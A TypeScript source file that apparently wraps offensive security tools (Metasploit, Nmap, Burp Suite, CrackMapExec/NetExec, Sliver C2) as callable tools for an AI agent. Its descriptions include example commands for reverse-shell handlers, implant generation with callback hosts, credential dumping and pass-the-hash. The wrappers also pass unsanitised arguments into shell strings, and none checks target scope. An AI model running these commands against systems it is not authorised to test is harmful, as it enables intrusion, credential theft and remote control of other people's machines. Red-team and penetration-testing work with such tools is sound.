import { Tool } from './Tool.js';
import { exec } from 'child_process';
import { promisify } from 'util';
import { SharedContext } from '../core/agent/SharedContext.js';

const execAsync = promisify(exec);
const MAX_OUTPUT = 16_000;
const DEFAULT_OFFENSIVE_TIMEOUT_MS = 120_000;

function truncate(s: string, max: number): string {
    return s.length > max ? s.slice(0, max) + '\n...[truncated]' : s;
}

async function shell(cmd: string, timeoutMs = DEFAULT_OFFENSIVE_TIMEOUT_MS): Promise<string> {
    try {
        const { stdout, stderr } = await execAsync(cmd, {
            timeout: timeoutMs,
            maxBuffer: MAX_OUTPUT * 4,
            env: { ...process.env }
        });
        const out = truncate(stdout.trim(), MAX_OUTPUT);
        const err = truncate(stderr.trim(), MAX_OUTPUT);
        return out + (err ? `\nSTDERR: ${err}` : '');
    } catch (e: any) {
        const out = truncate(e.stdout?.trim() || '', MAX_OUTPUT);
        const err = truncate(e.stderr?.trim() || e.message || '', MAX_OUTPUT);
        return (out + '\n' + err).trim();
    }
}

const isWin = process.platform === 'win32';

async function whichBinary(name: string, envOverride?: string): Promise<string | null> {
    if (envOverride && envOverride.trim()) return envOverride.trim();
    try {
        const cmd = isWin ? `where ${name}` : `which ${name}`;
        const { stdout } = await execAsync(cmd, { timeout: 5000 });
        const resolved = stdout.trim().split('\n')[0]?.trim();
        return resolved || null;
    } catch {
        return null;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. METASPLOIT FRAMEWORK
// ═══════════════════════════════════════════════════════════════════════════════

export class MetasploitTool extends Tool {
    name = 'msf_execute';
    description = `Execute Metasploit Framework commands via msfconsole. Supports the full Metasploit module library: auxiliary scanners, exploits, payloads, post-exploitation, and meterpreter commands. Commands are piped through msfconsole -qx. Separate multiple commands with semicolons. Use for: exploitation, payload generation, session management, post-exploitation, pivoting.`;
    schema = {
        type: 'object',
        properties: {
            command: {
                type: 'string',
                description: 'Metasploit RC-style command(s). Separate multiple commands with semicolons. Example: "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"'
            },
            timeoutMs: {
                type: 'number',
                description: 'Execution timeout in ms (default 120000). Exploits can take time — increase for long-running modules.'
            }
        },
        required: ['command'],
        additionalProperties: false
    };

    async execute(args: { command: string; timeoutMs?: number }, requestConfirmation: (msg: string) => Promise<boolean>): Promise<string> {
        const msfPath = await whichBinary('msfconsole', process.env.MSF_PATH);
        if (!msfPath) {
            return '[TOOL PREREQ]: msfconsole not found.\nInstall: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html\nOr set MSF_PATH env var to the msfconsole binary path.';
        }

        const approved = await requestConfirmation(
            `[NYX ARSENAL — METASPLOIT] Execute:\n  > ${args.command}\nThis runs msfconsole on the host. Allow? (Y/n)`
        );
        if (!approved) return '[USER OVERRIDE]: Metasploit execution denied.';

        const timeoutMs = args.timeoutMs ?? DEFAULT_OFFENSIVE_TIMEOUT_MS;
        const escaped = args.command.replace(/"/g, '\\"');
        const cmd = `"${msfPath}" -qx "${escaped}"`;

        SharedContext.appendAudit({ event: 'msf_execute', command: args.command });

        const result = await shell(cmd, timeoutMs);
        return `[METASPLOIT OUTPUT]:\n${result || 'Command completed with no output.'}`;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. NMAP WITH NSE SCRIPTS
// ═══════════════════════════════════════════════════════════════════════════════

export class NmapNseTool extends Tool {
    name = 'nmap_scan';
    description = `Advanced Nmap scanner with full NSE script engine support. Performs host discovery, port scanning, service/version detection, OS fingerprinting, and vulnerability assessment via NSE scripts. Supports all nmap flags and options. Use for: network reconnaissance, service enumeration, vulnerability scanning (e.g. --script=vuln, smb-vuln-ms17-010), brute-force (e.g. --script=brute), and full attack surface mapping.`;
    schema = {
        type: 'object',
        properties: {
            target: {
                type: 'string',
                description: 'Target host, IP, CIDR range, or hostname. Examples: "192.168.1.0/24", "10.0.0.1", "example.com"'
            },
            ports: {
                type: 'string',
                description: 'Port specification. Examples: "22,80,443", "1-65535", "T:80,443,U:53". Default: nmap default top 1000.'
            },
            scripts: {
                type: 'string',
                description: 'NSE script(s) to run. Examples: "vuln", "smb-vuln-ms17-010", "http-enum,http-headers", "default,safe", "brute". Omit to skip NSE.'
            },
            flags: {
                type: 'string',
                description: 'Additional nmap flags. Examples: "-sV -sC -A -O", "-sU", "-sS -T4 --min-rate 1000", "-Pn --open", "-sn" for ping sweep.'
            },
            outputFormat: {
                type: 'string',
                enum: ['normal', 'xml', 'grepable'],
                description: 'Output format. Default: normal.'
            },
            timeoutMs: {
                type: 'number',
                description: 'Execution timeout in ms (default 120000). Large subnet scans need more time.'
            }
        },
        required: ['target'],
        additionalProperties: false
    };

    async execute(args: {
        target: string;
        ports?: string;
        scripts?: string;
        flags?: string;
        outputFormat?: string;
        timeoutMs?: number;
    }): Promise<string> {
        const nmapPath = await whichBinary('nmap', process.env.NMAP_PATH);
        if (!nmapPath) {
            return '[TOOL PREREQ]: nmap not found.\nInstall: https://nmap.org/download.html\nWindows: choco install nmap / winget install nmap\nLinux: apt install nmap / yum install nmap';
        }

        const parts: string[] = [nmapPath];

        if (args.flags) parts.push(args.flags);
        if (args.ports) parts.push(`-p ${args.ports}`);
        if (args.scripts) parts.push(`--script=${args.scripts}`);

        switch (args.outputFormat) {
            case 'xml': parts.push('-oX -'); break;
            case 'grepable': parts.push('-oG -'); break;
            default: break;
        }

        parts.push(args.target);
        const cmd = parts.join(' ');
        const timeoutMs = args.timeoutMs ?? DEFAULT_OFFENSIVE_TIMEOUT_MS;

        SharedContext.appendAudit({ event: 'nmap_scan', target: args.target, flags: args.flags, scripts: args.scripts });

        const result = await shell(cmd, timeoutMs);
        return `[NMAP SCAN RESULTS]:\n${result || 'Scan completed with no output.'}`;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. BURP SUITE PROFESSIONAL (REST API)
// ═══════════════════════════════════════════════════════════════════════════════

export class BurpSuiteTool extends Tool {
    name = 'burp_api';
    description = `Interface to Burp Suite Professional via its REST API. Launch active scans against target URLs, retrieve discovered issues and vulnerabilities, and inspect the crawled sitemap. Requires Burp Suite Pro running locally with the REST API enabled (User options > Misc > REST API). Handles web application vulnerability assessment: SQLi, XSS, SSRF, IDOR, auth bypass, file upload, deserialization, and all OWASP Top 10 categories.`;
    schema = {
        type: 'object',
        properties: {
            action: {
                type: 'string',
                enum: ['scan', 'scan_status', 'issues', 'sitemap', 'stop_scan'],
                description: 'Action: "scan" to launch active scan on a URL, "scan_status" to check running scan, "issues" to get discovered vulnerabilities, "sitemap" for crawled pages, "stop_scan" to cancel.'
            },
            url: {
                type: 'string',
                description: 'Target URL for scanning. Required for "scan" action. Example: "https://target.com"'
            },
            taskId: {
                type: 'string',
                description: 'Scan task ID. Required for "scan_status" and "stop_scan".'
            },
            config: {
                type: 'string',
                description: 'Optional scan configuration name. Example: "Crawl and Audit - Fast", "Crawl and Audit - Deep".'
            }
        },
        required: ['action'],
        additionalProperties: false
    };

    private getBaseUrl(): string {
        const port = process.env.BURP_API_PORT || '1337';
        return `http://127.0.0.1:${port}/v0.1`;
    }

    private getHeaders(): Record<string, string> {
        const headers: Record<string, string> = { 'Content-Type': 'application/json' };
        if (process.env.BURP_API_KEY) {
            headers['Authorization'] = process.env.BURP_API_KEY;
        }
        return headers;
    }

    async execute(args: {
        action: string;
        url?: string;
        taskId?: string;
        config?: string;
    }): Promise<string> {
        const base = this.getBaseUrl();
        const headers = this.getHeaders();

        try {
            switch (args.action) {
                case 'scan': {
                    if (!args.url) return '[BURP ERROR]: URL is required for scan action.';
                    const scanConfig: any = { urls: [args.url] };
                    if (args.config) {
                        scanConfig.scan_configurations = [{ name: args.config, type: 'NamedConfiguration' }];
                    }
                    const resp = await fetch(`${base}/scan`, {
                        method: 'POST',
                        headers,
                        body: JSON.stringify(scanConfig)
                    });
                    if (!resp.ok) {
                        const body = await resp.text();
                        return `[BURP ERROR]: Scan launch failed (${resp.status}): ${body}`;
                    }
                    const location = resp.headers.get('location') || '';
                    const taskId = location.split('/').pop() || 'unknown';
                    SharedContext.appendAudit({ event: 'burp_scan_launched', url: args.url, taskId });
                    return `[BURP SUITE] Active scan launched.\nTarget: ${args.url}\nTask ID: ${taskId}\nUse burp_api action="scan_status" taskId="${taskId}" to check progress.`;
                }

                case 'scan_status': {
                    if (!args.taskId) return '[BURP ERROR]: taskId is required for scan_status action.';
                    const resp = await fetch(`${base}/scan/${args.taskId}`, { headers });
                    if (!resp.ok) return `[BURP ERROR]: Status check failed (${resp.status}).`;
                    const data = await resp.json() as any;
                    return `[BURP SCAN STATUS]:\nTask: ${args.taskId}\nStatus: ${data.scan_status || 'unknown'}\nIssues found: ${data.issue_events?.length || 0}\nAudit progress: ${JSON.stringify(data.scan_metrics?.audit_progress || {})}`;
                }

                case 'issues': {
                    const endpoint = args.taskId ? `${base}/scan/${args.taskId}` : `${base}/knowledge_base/issue_definitions`;
                    const resp = await fetch(endpoint, { headers });
                    if (!resp.ok) return `[BURP ERROR]: Issues fetch failed (${resp.status}).`;
                    const data = await resp.json() as any;
                    if (args.taskId && data.issue_events) {
                        const issues = data.issue_events.map((ie: any) => {
                            const i = ie.issue;
                            return `  [${i.severity}] ${i.name} — ${i.origin}${i.path} (confidence: ${i.confidence})`;
                        });
                        return `[BURP ISSUES] (${issues.length} found):\n${truncate(issues.join('\n'), MAX_OUTPUT)}`;
                    }
                    return `[BURP ISSUES]:\n${truncate(JSON.stringify(data, null, 2), MAX_OUTPUT)}`;
                }

                case 'sitemap': {
                    const resp = await fetch(`${base}/sitemap`, { headers });
                    if (!resp.ok) return `[BURP ERROR]: Sitemap fetch failed (${resp.status}).`;
                    const data = await resp.text();
                    return `[BURP SITEMAP]:\n${truncate(data, MAX_OUTPUT)}`;
                }

                case 'stop_scan': {
                    if (!args.taskId) return '[BURP ERROR]: taskId is required for stop_scan action.';
                    const resp = await fetch(`${base}/scan/${args.taskId}`, {
                        method: 'DELETE',
                        headers
                    });
                    if (!resp.ok) return `[BURP ERROR]: Stop failed (${resp.status}).`;
                    SharedContext.appendAudit({ event: 'burp_scan_stopped', taskId: args.taskId });
                    return `[BURP SUITE] Scan ${args.taskId} stopped.`;
                }

                default:
                    return `[BURP ERROR]: Unknown action "${args.action}". Valid: scan, scan_status, issues, sitemap, stop_scan.`;
            }
        } catch (e: any) {
            if (e.message?.includes('ECONNREFUSED') || e.message?.includes('fetch failed')) {
                return `[BURP SUITE NOT REACHABLE]: Cannot connect to Burp REST API at ${base}.\n\nSetup:\n1. Open Burp Suite Professional\n2. Go to User options > Misc > REST API\n3. Enable "Service running"\n4. Set port to ${process.env.BURP_API_PORT || '1337'}\n5. Optionally set BURP_API_KEY in .env`;
            }
            return `[BURP ERROR]: ${e.message}`;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. CRACKMAPEXEC / NETEXEC
// ═══════════════════════════════════════════════════════════════════════════════

export class CrackMapExecTool extends Tool {
    name = 'cme_execute';
    description = `Execute CrackMapExec (or NetExec) for Active Directory and network lateral movement. Supports protocols: SMB, WinRM, MSSQL, RDP, LDAP, SSH. Capabilities: credential spraying, SAM/LSA/LSASS dumping, share enumeration, command execution, pass-the-hash, Kerberoasting, BloodHound collection. The single most effective tool for Windows domain takeover.`;
    schema = {
        type: 'object',
        properties: {
            protocol: {
                type: 'string',
                enum: ['smb', 'winrm', 'mssql', 'rdp', 'ldap', 'ssh', 'ftp', 'vnc'],
                description: 'Protocol to attack over.'
            },
            target: {
                type: 'string',
                description: 'Target IP, hostname, CIDR range, or file with targets. Examples: "192.168.1.0/24", "dc01.corp.local"'
            },
            username: {
                type: 'string',
                description: 'Username or file of usernames. Use -u syntax.'
            },
            password: {
                type: 'string',
                description: 'Password, NTLM hash (LM:NT), or file of passwords. Hashes require --hash flag in extraFlags.'
            },
            domain: {
                type: 'string',
                description: 'Domain name. Example: "corp.local"'
            },
            command: {
                type: 'string',
                description: 'Command to execute on target. Use with -x (cmd) or -X (PowerShell) in extraFlags.'
            },
            extraFlags: {
                type: 'string',
                description: 'Additional CME flags. Examples: "--sam", "--lsa", "--ntds", "--shares", "--sessions", "--loggedon-users", "--pass-pol", "-x", "-X", "--exec-method smbexec", "--hash", "--local-auth", "--spider", "--get-file", "--put-file", "-M <module>"'
            },
            timeoutMs: {
                type: 'number',
                description: 'Timeout in ms (default 120000).'
            }
        },
        required: ['protocol', 'target'],
        additionalProperties: false
    };

    async execute(args: {
        protocol: string;
        target: string;
        username?: string;
        password?: string;
        domain?: string;
        command?: string;
        extraFlags?: string;
        timeoutMs?: number;
    }, requestConfirmation: (msg: string) => Promise<boolean>): Promise<string> {
        // Try nxc (NetExec, maintained fork) first, then crackmapexec
        let cmePath = await whichBinary('nxc', process.env.CME_PATH);
        let binaryName = 'nxc';
        if (!cmePath) {
            cmePath = await whichBinary('crackmapexec');
            binaryName = 'crackmapexec';
        }
        if (!cmePath) {
            return '[TOOL PREREQ]: Neither nxc (NetExec) nor crackmapexec found.\nInstall NetExec: pip install netexec\nInstall CME: pip install crackmapexec\nOr set CME_PATH env var.';
        }

        const parts: string[] = [cmePath, args.protocol, args.target];
        if (args.username) parts.push(`-u "${args.username}"`);
        if (args.password) parts.push(`-p "${args.password}"`);
        if (args.domain) parts.push(`-d "${args.domain}"`);
        if (args.command) parts.push(`-x "${args.command}"`);
        if (args.extraFlags) parts.push(args.extraFlags);

        const cmdLine = parts.join(' ');
        const approved = await requestConfirmation(
            `[NYX ARSENAL — CRACKMAPEXEC] Execute:\n  > ${cmdLine}\nThis performs active network operations. Allow? (Y/n)`
        );
        if (!approved) return '[USER OVERRIDE]: CrackMapExec execution denied.';

        const timeoutMs = args.timeoutMs ?? DEFAULT_OFFENSIVE_TIMEOUT_MS;
        SharedContext.appendAudit({
            event: 'cme_execute',
            binary: binaryName,
            protocol: args.protocol,
            target: args.target,
            flags: args.extraFlags
        });

        const result = await shell(cmdLine, timeoutMs);
        return `[CRACKMAPEXEC OUTPUT]:\n${result || 'Command completed with no output.'}`;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. SLIVER C2 FRAMEWORK
// ═══════════════════════════════════════════════════════════════════════════════

export class SliverTool extends Tool {
    name = 'sliver_execute';
    description = `Execute Sliver C2 framework commands. Sliver is an open-source adversary emulation framework for red team operations. Supports: implant generation (HTTPS/DNS/WireGuard/mTLS), listener management, session interaction, process injection, lateral movement, pivoting, SOCKS proxy, credential harvesting, Kerberos tools. Cross-platform implants for Windows/Linux/macOS.`;
    schema = {
        type: 'object',
        properties: {
            command: {
                type: 'string',
                description: 'Sliver client command. Examples: "generate --mtls 10.0.0.1 --os windows --arch amd64 --format exe --save implant.exe", "mtls -l 4444", "sessions", "use <session-id>", "execute-assembly /path/to/tool.exe", "socks5 start"'
            },
            timeoutMs: {
                type: 'number',
                description: 'Timeout in ms (default 120000). Implant generation can take 60+ seconds.'
            }
        },
        required: ['command'],
        additionalProperties: false
    };

    async execute(args: { command: string; timeoutMs?: number }, requestConfirmation: (msg: string) => Promise<boolean>): Promise<string> {
        const sliverPath = await whichBinary('sliver', process.env.SLIVER_PATH);
        if (!sliverPath) {
            return '[TOOL PREREQ]: sliver not found.\nInstall: https://github.com/BishopFox/sliver/wiki/Getting-Started\nLinux one-liner: curl https://sliver.sh/install | sudo bash\nOr set SLIVER_PATH env var.';
        }

        const approved = await requestConfirmation(
            `[NYX ARSENAL — SLIVER C2] Execute:\n  > ${args.command}\nThis interacts with the Sliver C2 framework. Allow? (Y/n)`
        );
        if (!approved) return '[USER OVERRIDE]: Sliver execution denied.';

        const timeoutMs = args.timeoutMs ?? DEFAULT_OFFENSIVE_TIMEOUT_MS;
        const escaped = args.command.replace(/"/g, '\\"');
        const cmd = `"${sliverPath}" -e "${escaped}"`;

        SharedContext.appendAudit({ event: 'sliver_execute', command: args.command });

        const result = await shell(cmd, timeoutMs);
        return `[SLIVER C2 OUTPUT]:\n${result || 'Command completed with no output.'}`;
    }
}
